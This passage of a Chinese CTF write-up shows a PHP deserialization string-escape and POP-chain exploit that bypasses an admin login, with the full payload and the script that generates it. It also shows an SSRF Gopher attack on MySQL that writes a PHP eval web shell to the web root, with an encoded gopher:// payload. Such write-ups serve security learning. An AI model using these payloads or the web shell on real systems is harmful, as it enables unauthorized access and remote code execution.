class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由于一开始未成功登陆，第一个 if 必然不通过，因此若想要返回 id 值从而对 <code>$_SESSION['login']</code>  赋值，那么要通过第三个判断（第二个判断只要 sql 语句执行成功就可），也就是要使得输入的 <code>password</code>  与 sql 查出来的 <code>password</code>  相同，由于预设的 sql 语句为 <code>select id,password from user where username=?</code> , 不妨将 id、password 分别改为 1 和 1 对应的 md5 值，从而查出来的 <code>password</code>  的 md5 值可控。满足该判断条件，之后将执行 <code>$_SESSION['token']=$this-&gt;name;</code>  可使得在下一次进入该函数时直接通过第一个判断。至此，得到两种方法，第一种调用 <code>User</code>  类的 <code>login</code>  方法，其中对 <code>dbCtrl</code>  类的 <code>login</code>  进行控制；第二种调用 <code>dbCtrl</code>  的 <code>login</code>  方法。但由于在调用 <code>User</code>  类的 <code>login</code>  方法时无法对 <code>dbCtrl</code>  直接进行操作，故这里采用第二种方法。</p>\n<p>要想进行如上操作， <code>User</code>  类的 <code>login</code>  方法执行路口，也即要找到反序列化入口。观察源码，可知 <code>User</code>  类中的 <code>update</code>  方法中有语句 <code>$Info=unserialize($this-&gt;getNewinfo());</code> , 再结合 <code>update.php</code>  中的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可知， <code>User</code>  类中的 <code>update</code>  方法可以执行，再看其反序列化对象 <code>$this-&gt;getNewinfo()</code> ，由 <code>safe(serialize(new Info($age,$nickname)))</code>  得到而 age，nickname 分别由 post 上传得到，可控，反序列化入口找到。而恰好 <code>update.php</code>  会执行 <code>User</code>  的 <code>update</code>  方法</p>\n<p>现在首先先不看 <code>safe</code>  方法，我们需要通过 <code>Info</code>  类来执行 <code>User</code>  类中的 <code>login</code>  方法，观察 <code>Info</code>  类，可看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>恰好执行了 login 方法，那么我们所需要做的是反序列化时使得 CtrlCase 对应的一个对象从而调用 User 类的 login 方法或直接为 User 类，而要调用此__call 魔术方法，需要使用 Info 类调用不存在的方法，也就是说我们需要找到一个位置调用 Info 类的一个方法，再回到源码，可以发现 User 类中和 UpdateHelper 类中分别有方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//UpdateHelper</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这样我们可以通过 <code>UpdateHelper</code>  类的 <code>__destruct</code>  方法来调用 <code>User</code>  类的 <code>__toString</code>  方法，如果此时 <code>nickname</code>  值为 <code>Info</code>  类对象，这里调用了 <code>Info</code>  类中的 <code>update</code>  方法，但由于 <code>Info</code>  类中没有此方法，便调用了 <code>__call</code>  方法，实现了之前的目的。</p>\n<p>至此，对于方法的调用结束，这时需要想办法进行序列化操作，通过反序列化得到一个满足条件的 <code>Info</code>  类</p>\n<p><code>Info</code>  类中， <code>CtrlCase</code>  为一个 <code>UpdateHelper</code>  对象，摧毁时，自自动执行 <code>echo $this-&gt;sql;</code> , 而 <code>sql</code>  对应一个一个 <code>User</code>  对象，自动调用 <code>nickname</code>  的 <code>update</code>  方法，此时 <code>nickname</code>  为一个 <code>Info</code>  对象，无  <code>update</code>  方法，调用 <code>__call</code>  方法，之后执行 <code>echo $this-&gt;CtrlCase-&gt;login($argument[0]);</code> , 而此时 <code>CtrlCase</code>  为一个 <code>dbCtrl</code>  对象，调用其 <code>login</code>  方法， <code>sql</code>  语句为前一个 <code>User</code>  的 <code>age</code> ，即 <code>age</code>  赋值为 <code>SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?</code> , 所以进行该语句，通过所有函数， <code>$_SESSION['token']=$this-&gt;name</code>  执行，下一次再进入时，可直接登陆成功</p>\n<p>这里看 <code>Info</code>  类的 <code>__construct</code>  方法，只对 <code>age</code>  和 <code>nickname</code>  进行赋值，根据上面的分析，必须要有 <code>CtrlCase</code>  变量的赋值，所以这里采用手动添加，值为一个 <code>UpdateHelper</code>  的序列化字符串，即为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\\<span class=\"token string double-quoted-string\">\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$updateHelper</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>要想成功反序列化，即让添加的 <code>CtrlCase</code>  成功反序列化，我们需要反序列化逃逸，所幸在进行反序列化操作前，用 <code>safe</code>  函数对字符串进行了过滤，会将符合条件的字符串修改为 <code>hacker</code> ，为字符串逃逸提供条件，这里为了减少序列化字符串量，使用 <code>into</code>  转换，一次多两个字符</p>\n<p>这里先给出序列化类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql 查询语句，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 密码，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$in</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$in</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 类内的 Info 对象的 CtrlCase 为一个 dbCrtl 对象</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$in</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//nickname 为一个 Info 类对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$updateHelper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$updateHelper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//UpdateHelper 对象的 sql 为一个 User 对象</span></pre></td></tr></tbody></table></figure><p>由于 <code>Info</code>  类序列化结果为 <code>O:4:\"Info\":3:{s:3:\"age\";s:2:\"xx\";s:8:\"nickname\";s:3:\"xxx\"</code>  的格式，这里为了让后面添加成功，不妨先用 <code>\"</code>  提前闭合 nickname 的值，之后添加 <code>;s:8:\\\"CtrlCase\\\";\" . serialize($updateHelper). \"}\";</code>  (加  <code>} </code> 是为了闭合第一个 <code>{ </code> ，使反序列化成功， <code>echo</code>  后，加上添加的 <code>\"</code>  、 <code>}</code>  总共为 302 个字符，所有有一个 into 换一个 hacker 多两个字符算，总共有 151 个 <code>into</code> ，故 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>age=18&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:69:\"SELECT 1,\"c4ca4238a0b923820dcc509a6f75849b\"from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";}}}}}</pre></td></tr></tbody></table></figure><p>脚本为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 16:12:08</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-21 16:28:22</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$uh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$uh</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// 此为 nickname 的值</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"into\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">151</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\\";s:8:\\\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uh</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"}\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"web15-fishman\"><a class=\"anchor\" href=\"#web15-fishman\">#</a> web15 Fishman</h2>\n<p>不会</p>\n<h2 id=\"红包题第九弹\"><a class=\"anchor\" href=\"#红包题第九弹\">#</a> 红包题第九弹</h2>\n<p>SSRF Gopher 协议 攻击 mysql 写入</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]); ?&gt;'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/var/www/html/1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>数据库名臣为 root<br>\n 是由 Gopher 工具<br>\n生成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01</pre></td></tr></tbody></table></figure><p>之后进行 url 编码<br>\n最后 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td 